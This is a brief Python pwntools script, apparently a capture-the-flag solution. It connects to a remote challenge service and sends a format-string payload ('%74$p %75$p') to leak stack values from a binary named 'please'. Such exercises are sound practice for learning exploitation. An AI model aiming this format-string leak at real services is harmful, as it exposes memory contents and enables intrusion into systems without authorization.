from pwn import *

io = remote('mc.ax', 31569)
#io = process('./please')
io.sendline(b'pleaseAA %74$p %75$p')
print(io.recvall())
